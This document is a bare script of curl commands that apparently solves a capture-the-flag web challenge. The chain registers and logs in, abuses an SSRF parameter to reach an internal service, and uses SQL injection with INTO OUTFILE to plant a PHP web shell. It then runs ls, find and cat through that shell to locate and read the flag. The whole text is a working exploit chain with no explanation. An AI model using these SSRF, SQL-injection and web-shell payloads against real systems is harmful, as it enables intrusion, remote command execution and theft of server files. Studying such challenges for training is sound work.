
# Step 1: Register a new user
curl -X POST http://94.237.58.4:32307/register.php -d "name=Ciphers&username=INDCiphers&password=password123"


# Step 2: Login and save session cookie
curl -c cookies.txt -X POST http://94.237.58.4:32307/login.php -d "username=INDCiphers" -d "password=password123"

# Step 3: SSRF to internal web service 
curl -b cookies.txt -X POST http://94.237.58.4:32307/communicate.php -F "url=0://127.0.0.1:80,motherland.com:/" -F "data[new_name]=Jammed" -F "data[action]=edit"

# Step 4: Upload working PHP web shell to /var/www/html/
curl -b cookies.txt -X POST http://94.237.58.4:32307/communicate.php \
--data-urlencode "url=0://127.0.0.1:80,motherland.com:/" \
--data-urlencode "data[new_name]=safe' UNION SELECT NULL,'<?=`$_GET[cmd]`; ?>',NULL,NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -" \
--data-urlencode "data[action]=edit"


# Step 5: Test if shell is working with id 
curl -b cookies.txt http://94.237.58.4:32307/index.php

# Step 6: List all directories recursively 
curl "http://94.237.58.4:32307/shell.php?cmd=ls%20-R"


# Step 7: Find files with 'flag' in name 
curl "http://94.237.58.4:32307/shell.php?cmd=find%20/%20-name%20'*flag*'"

# Step 8: Read the flag file 
curl "http://94.237.58.4:32307/shell.php?cmd=cat%20/60597c54d78cfe6f_flag.txt"





